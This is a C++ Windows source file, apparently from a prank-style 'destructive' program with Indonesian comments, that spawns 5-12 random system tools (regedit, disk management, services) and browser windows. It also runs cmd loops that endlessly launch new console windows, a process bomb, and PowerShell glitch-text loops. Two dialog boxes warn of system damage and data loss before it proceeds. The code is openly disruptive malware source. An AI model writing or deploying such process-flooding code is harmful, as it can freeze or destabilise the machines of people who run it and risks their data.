#include "Utilities.h"
#include "DestructiveActions.h"
#include <shellapi.h>
#include <iostream>
#include <thread>

#pragma comment(lib, "shell32.lib")

void OpenRandomPopups() {
    const wchar_t* commands[] = {
        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 100 }\"",
        L"notepad.exe",
        L"explorer.exe",
        L"write.exe",
        L"calc.exe",
        L"mspaint.exe",
        L"regedit.exe",
        L"taskmgr.exe",
        L"control.exe",
        L"mmc.exe",
        L"services.msc",
        L"eventvwr.msc",
        L"compmgmt.msc",
        L"diskmgmt.msc"
    };

    int numPopups = 5 + rand() % 8; // 5-12 popup sekaligus
    bool spawnSpam = (rand() % 2 == 0); // 50% chance spawn cmd spammer

    for (int i = 0; i < numPopups; i++) {
        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
        
        // Untuk cmd spam khusus
        if (spawnSpam && i == 0) {
            ShellExecuteW(NULL, L"open", L"cmd.exe", 
                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
                NULL, SW_SHOWMINIMIZED);
            continue;
        }

        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"open";
        sei.lpFile = L"cmd.exe";
        sei.lpParameters = commands[cmdIndex];
        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        
        ShellExecuteExW(&sei);
        if (sei.hProcess) CloseHandle(sei.hProcess);
        
        Sleep(50); // Shorter delay between popups
    }

    // Spawn khusus Windows Terminal jika ada
    if (rand() % 3 == 0) {
        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
    }
    
    // Spawn multiple instances of browser with error pages
    if (rand() % 4 == 0) {
        const wchar_t* errorUrls[] = {
            L"https://www.google.com/search?q=system+error+0x0000000A",
            L"https://www.bing.com/search?q=critical+system+failure",
            L"https://www.youtube.com/results?search_query=blue+screen+of+death",
            L"https://www.wikipedia.org/wiki/Fatal_system_error"
        };
        
        for (int i = 0; i < 3; i++) {
            int urlIndex = rand() % (sizeof(errorUrls)/sizeof(errorUrls[0]));
            ShellExecuteW(NULL, L"open", L"iexplore.exe", errorUrls[urlIndex], NULL, SW_SHOWMAXIMIZED);
        }
    }
}

BOOL ShowWarningMessages() {
    if (MessageBoxW(NULL, 
        L"WARNING: This program will cause serious system damage!\n\n"
        L"Proceed only if you understand the risks."
        L"This program is NOT TO BE TESTED ON A PRODUCTIVE COMPUTER.\n\n"
        L"Do you really want to continue?",
        L"CRITICAL SECURITY ALERT", 
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES)
    {
        return FALSE;
    }
    
    if (MessageBoxW(NULL, 
        L"FINAL WARNING: This will cause:\n"
        L"- Extreme visual impact\n"
        L"- Continuous system pop-ups\n"
        L"- Possible system damage\n"
        L"- Computer instability\n"
        L"- Data loss and corruption\n\n"
        L"Press 'OK' only if you are ready to accept the consequences.",
        L"FINAL CONFIRMATION", 
        MB_OKCANCEL | MB_ICONERROR | MB_DEFBUTTON2) != IDOK)
    {
        return FALSE;
    }

    return TRUE;
}
